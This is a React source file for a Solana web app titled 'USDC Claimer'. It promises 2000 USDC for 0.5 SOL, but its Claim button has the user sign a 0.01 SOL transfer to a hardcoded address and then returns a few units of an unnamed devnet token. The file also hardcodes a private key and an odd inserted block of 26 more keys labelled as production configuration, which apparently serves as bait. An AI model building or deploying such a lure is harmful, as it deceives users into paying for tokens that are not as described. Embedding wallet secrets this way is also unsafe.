/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5ngXbDbirjqiuLADMEFixUo9B93ujANjKEgtw6jyJ4dfnBWGeeyudg9QG53Sbsjv5H72mRbmAgjrs7MdBjX7Sgk7"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5fjzMA8Lp25ejgDoLuBfzHNicBmqFY8abyPrhKU4trYUzGt3XjZLafekaw1nhXMbmgpjhMfyM9koycujizVLwGXy",
  "key1": "3uJHcY1f6Fd5wvv6PJ8XdPGGoCfWoyS8qMuTLbMyVNUKk7b1AFrDhyrTUaTPbqCK5PPXJiTRbc5qLGQ7u7i8zu8P",
  "key2": "2E4pc6G8vgM7YtnPbZrDt6LUZ6qitFAsK4PwQcToxw1xHmCGhK6RrSTxYHrEBoHyaXUWHAmdart6eeXRXcytqKa5",
  "key3": "63TKgNH82mWt25yBt5P8QPRadoxhEzbZgVzaT2aiUA6k1YhDRHeMBhdChzzRMoF6w7kJaPfZA4RmQjbmov8P8H2t",
  "key4": "2R2QeDXWsQtzyAePgBufR3LJs6rEUeextYmfQ7oxCHMrNeSva4EUn4daGtZkKEhDQ24ow1fXyVKUsGEeRb1Ngi6W",
  "key5": "5EDzuhDzaWeG3QLvYcSkotqkDTNApuZnkPdX4CtUH6md1VqoNgfsaq7TAUh3F6LEHiB56m34JG4H1mdJKgo1edvY",
  "key6": "4yey69TLW6KPcPABWcf6jZWoSyh3TGqQddYR8vRU2KRbBbyiUSFmuhDbcUL2JznSm6Wh1BU9SeeWtzHac8wxxzMA",
  "key7": "3Q2Fz2G67W3xz7pKksuHhpfzWq5MMZPK9Sgokj21g9GZhoi1KprnXjR5EUciD7452UsYWQwVtaVqcjdKyr9LhEKs",
  "key8": "4iyfaRtkcftKWjeBwq467bEhGPnUddrhhPWP4x6FG7BPWczYChGKwjiDa1cQ2UeoLy5ADfsTZASQLi4JcqsBiHRx",
  "key9": "2nH6WAo9vgJsfxwMQHpXgZrbkA62o1W1n9nePdjjFKeSgGmqNiwFKCXbhi2sbaGHMHK7hqwUbGPcQszax5LEz2Y3",
  "key10": "5GXRrborru9MkTGM6xBMVfpPwCVuf6yUFqxcqrBem1tk71oKw7cTVpLNCEyW66jgE76mdfGsMZuVznCPAnsfWLAN",
  "key11": "t6BGgjqrHFU4QZp3Hwp1odsWaVBcN6nCEa4BHCzsww5SUS8J6LxW73dDeMDS8fLhrvwuRZDPF5i9XFoiEeQWW9Z",
  "key12": "3C5NL7oxYUEiHjWRV3g9p8Ls9aXPUy7UF6DnbvmU5zC8aqz1YAmT8ZbS5Zv5c6qirGS2F851hmQqXVSKrQbjheuu",
  "key13": "5wAU2tCEk69ehcE6yfVDmkdr6GQM6E3s7Gp8px3TtyrxBf7vxSbttAaFepBCYjzSFjzY1kAx68WavLdg2Q4KjDt1",
  "key14": "YvDg8Ke6eJQq9V7Y67gwB3PqMsiVNhbhXQP3iJwN69qLyKZ9ejdKXsf5MkVMPbWDnCjfQ5Xcx7Lk2jhbSWdKBFq",
  "key15": "5XzvLVV2g2j1MhcvT57YhDGqydnp7VKcvpE8rQgop7pTsQADr1ZxgfSWcM87riMpQg2j2xSDdg64gZrN4Wker2oM",
  "key16": "5nUn2N4pEjU7i5zeRy8D2EL8unykvxwjbCcDkVqUQZe2sazd93atBZwN9ki9yzUzsTtSE8BT2zS28GEiHizdM1vN",
  "key17": "5eatfFPgDQKsP31p6Dg6Cjvc6MT3ngpz7PeaR1SW9RK8yNCu6yNWEM2XhWpH654pMVJH7hP72J689DrxcEbJBWSp",
  "key18": "2Pr7se6GKyiaDSMtdUgj5Fsi8W1hwHVmdpLheZymEjwi77Que4QmYf5w8rdpLgHfzZFumt1fi3UZ2Gv8eVjLscEt",
  "key19": "3zGEEvS9dn8eWvie3rb8mdqJhAL8hQC9ngbdpn2pCgjKghcjfT2f88fFbB7MgJTW9rxc8KZqKYpdGCqRhT2rXGmh",
  "key20": "4tUZh8RFZndsySFZddrZpp76Qgsu8JtPTio4KwmxExurEbHHHb4h7rsAMvYrtWFLMkwtNG48pMqPy3bCnQLfaYkq",
  "key21": "49YYRsjNaoPhYH2PmWksJDXa5QxvUrHJtUHrQZ51nFBirPeNvz6Wfnq5fx6jpQg5YZ7KbTvNyRu2aM9UAGJDyyv",
  "key22": "3Jc4BnTh5G13i5LsEJJMvWH1vmu3hKLr3kr5aAeMrwRw9ZgEoEsCR6Nj7joAwFZcFox94eKFaKaDr1viyrNoqsjP",
  "key23": "2W48jAQPonzDGsRLh2UYHZK83bdfJ9SrYmQLjSZfeQKM9p4GapScfAWo3LSinfXAqA8KrpxWn3eNRssZAnEeMrMz",
  "key24": "4S1n7ZUkva38kAfmRidkredZDWR3cVJnXyr6SdC2GC2uA8kbqffeRQG13XjLmp8LzBrniGJK1TE4guHSKsEjWiHA",
  "key25": "2dhvyWjWRVFFBnWpLjhZFwZaT85J9t4qcG1fWcpWx4bcfZqYXRkp8bbds7udrKpEV1SYwxUzSSRN6wMn5yRzcehB"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
